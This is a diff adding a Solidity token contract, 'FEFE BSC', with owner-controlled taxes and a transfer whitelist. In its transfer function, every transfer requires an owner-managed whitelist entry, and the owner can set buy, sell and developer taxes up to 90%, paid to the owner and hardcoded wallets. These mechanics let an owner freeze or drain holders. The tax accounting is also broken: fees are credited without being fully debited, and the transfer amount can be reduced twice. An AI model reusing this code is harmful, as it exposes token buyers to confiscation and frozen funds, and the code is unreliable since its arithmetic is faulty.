@@ -1,0 +1,112 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity 0.8.19;
+
+contract FEFEBSC {
+    string public name = "FEFE BSC";
+    string public symbol = "FEF";
+    uint8 public decimals = 9;
+    uint256 public totalSupply = 1000000000 * 10**decimals;
+    address public owner;
+    address public marketingWallet = 0xA04869baEa93a898E201207d84146FC98c82943E;
+    address public devFeeWallet = 0xbDC35d92Bc5bDF2e568f689fEdC74AAd67B9DF4D;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    mapping(address => bool) public whitelist;
+
+    uint256 public buyTaxPercentage = 0;
+    uint256 public sellTaxPercentage = 0;
+    uint256 public devFeePercentage = 0;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    constructor() {
+        owner = msg.sender;
+        balanceOf[owner] = totalSupply;
+        emit Transfer(address(0), owner, totalSupply);
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only owner can call this function.");
+        _;
+    }
+
+    function addToWhitelist(address _address) public onlyOwner {
+        whitelist[_address] = true;
+    }
+
+    function removeFromWhitelist(address _address) public onlyOwner {
+        whitelist[_address] = false;
+    }
+
+    function setBuyTaxPercentage(uint256 _percentage) public onlyOwner {
+        require(_percentage <= 90, "Buy tax percentage must be 90 or less.");
+        buyTaxPercentage = _percentage;
+    }
+
+    function setSellTaxPercentage(uint256 _percentage) public onlyOwner {
+        require(_percentage <= 90, "Sell tax percentage must be 90 or less.");
+        sellTaxPercentage = _percentage;
+    }
+
+    function setDevFeePercentage(uint256 _percentage) public onlyOwner {
+        require(_percentage <= 90, "Development fee percentage must be 90 or less.");
+        devFeePercentage = _percentage;
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool success) {
+        require(balanceOf[msg.sender] >= _value, "Insufficient balance.");
+        _transfer(msg.sender, _to, _value);
+        return true;
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
+        require(balanceOf[_from] >= _value, "Insufficient balance.");
+        require(allowance[_from][msg.sender] >= _value, "Must allow sufficient transfer amount.");
+        _transfer(_from, _to, _value);
+        allowance[_from][msg.sender] -= _value;
+        return true;
+    }
+
+    function approve(address _spender, uint256 _value) public returns (bool success) {
+        allowance[msg.sender][_spender] = _value;
+        emit Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function _transfer(address _from, address _to, uint256 _value) internal {
+        require(_to != address(0), "Cannot send tokens to zero address.");
+        require(whitelist[_from] || whitelist[_to], "Transfer address must be whitelisted.");
+
+        uint256 sellTaxAmount;
+
+        if (_from == owner || _to == owner) {
+            sellTaxAmount = 0;
+        } else if (_from == marketingWallet || _to == marketingWallet) {
+            sellTaxAmount = (_value * sellTaxPercentage) / 100;
+        } else {
+            uint256 buyTaxAmount = (_value * buyTaxPercentage) / 100;
+            balanceOf[owner] += buyTaxAmount;
+            _value -= buyTaxAmount;
+
+            sellTaxAmount = (_value * sellTaxPercentage) / 100;
+            balanceOf[owner] += sellTaxAmount;
+            _value -= sellTaxAmount;
+        }
+        
+        if (sellTaxAmount > 0) {
+            balanceOf[marketingWallet] += sellTaxAmount;
+            uint256 devFee = (sellTaxAmount * devFeePercentage) / 100;
+            balanceOf[devFeeWallet] += devFee;
+            sellTaxAmount -= devFee;
+            _value -= sellTaxAmount;
+        }
+
+        balanceOf[_from] -= _value;
+        balanceOf[_to] += _value;
+
+        emit Transfer(_from, _to, _value);
+    }
+}
